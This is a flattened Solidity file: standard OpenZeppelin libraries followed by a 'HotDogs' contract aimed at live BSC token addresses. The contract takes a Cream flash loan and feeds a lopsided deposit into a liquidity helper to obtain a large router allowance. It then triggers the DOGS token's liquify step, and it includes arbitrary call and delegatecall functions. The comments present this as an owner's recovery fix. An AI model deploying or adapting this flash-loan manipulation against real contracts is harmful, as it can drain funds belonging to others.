// File: @openzeppelin/contracts/utils/Context.sol


// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: @openzeppelin/contracts/access/Ownable.sol


// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

pragma solidity ^0.8.0;


/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: @openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol


// OpenZeppelin Contracts v4.4.1 (interfaces/IERC3156FlashBorrower.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC3156 FlashBorrower, as defined in
 * https://eips.ethereum.org/EIPS/eip-3156[ERC-3156].
 *
 * _Available since v4.1._
 */
interface IERC3156FlashBorrower {
    /**
     * @dev Receive a flash loan.
     * @param initiator The initiator of the loan.
     * @param token The loan currency.
     * @param amount The amount of tokens lent.
     * @param fee The additional amount of tokens to repay.
     * @param data Arbitrary data structure, intended to contain user-defined parameters.
     * @return The keccak256 hash of "ERC3156FlashBorrower.onFlashLoan"
     */
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

// File: @openzeppelin/contracts/token/ERC20/IERC20.sol


// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: test3.sol

pragma solidity 0.8.7;





interface Dogs is IERC20 {
    function updateSwapAndLiquifyEnabled(bool _enabled) external;
    function transferOperator(address newOperator) external;
}

interface CreamMarket {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address initiator,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

interface AddLiqHelper {
    function addPigsLiquidity(address baseTokenAddress, uint256 baseAmount, uint256 nativeAmount) external;
}

/// @notice IMPORTANT: This contract must always have >= 0.1 PIGS, 0.1 DOGS, 1000 BUSD.
/// @dev To reclaim token
contract HotDogs is Ownable, IERC3156FlashBorrower {
    CreamMarket public constant BUSD_MARKET = CreamMarket(0x2Bc4eb013DDee29D37920938B96d353171289B7C);

    AddLiqHelper public constant LIQ_HELPER = AddLiqHelper(0xAe672d88Eff0Bc3f561044e7F41ee7099610Fa97);

    IERC20 public constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 public constant PIG = IERC20(0x3A4C15F96B3b058ab3Fb5FAf1440Cc19E7AE07ce);
    Dogs public constant DOGS = Dogs(0xDBdC73B95cC0D5e7E99dC95523045Fc8d075Fb9e);

    address public constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    constructor() {
        BUSD.approve(address(BUSD_MARKET), type(uint256).max);
        BUSD.approve(address(LIQ_HELPER), type(uint256).max);
        PIG.approve(address(LIQ_HELPER), type(uint256).max);
    }

    address public origin;

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        require(tx.origin == origin, "dumb origin check failed");
        // HERE WE HAVE THE LARGE AMOUNT (amount) OF BUSD TO DO AS WE PLEASE
        DOGS.updateSwapAndLiquifyEnabled(true);
        // 1. We add the pigs liquidity with a very high BUSD amount but low pig amount, this will refund most busd causing the LIQ_HELPER to have a large BUSD allowance to the router (we need this)
        LIQ_HELPER.addPigsLiquidity(address(BUSD), amount, 1); // amount BUSD, 1 PIG

        // 2. Trigger liquify.
        DOGS.transfer(tx.origin, 1);

        DOGS.updateSwapAndLiquifyEnabled(false);

        return keccak256("ERC3156FlashBorrowerInterface.onFlashLoan");
    }

    function executeFlashFix() external onlyOwner {
        origin = tx.origin;
        // 1. Borrow BUSD from cream
        uint256 busdAmount = BUSD.balanceOf(address(DOGS)) * 11 / 10 / 2; // Take 10% extra BUSD to have some margin.
        BUSD_MARKET.flashLoan(this, address(this), busdAmount, "");
    }

    function inCaseTokensGetStuck(
        address _token,
        uint256 _amount,
        address _to
    ) external onlyOwner {
        IERC20(_token).transfer(_to, _amount);
    }

    function reclaimOperatorShip() external onlyOwner {
        DOGS.transferOperator(msg.sender);
    }

    function executeTransaction(address target, uint value, bytes memory data) external payable onlyOwner returns (bytes memory) {
        (bool success, bytes memory returnData) = target.call{value:value}(data);
        require(success, "Reverted.");
        return returnData;
    }

    function executeDelegateTransaction(address target, bytes memory data) external payable onlyOwner returns (bytes memory) {
        (bool success, bytes memory returnData) = target.delegatecall(data);
        require(success, "Reverted.");
        return returnData;
    }


    function getAllowance() external view returns (uint256) {
        return BUSD.allowance(address(LIQ_HELPER), ROUTER);
    }

}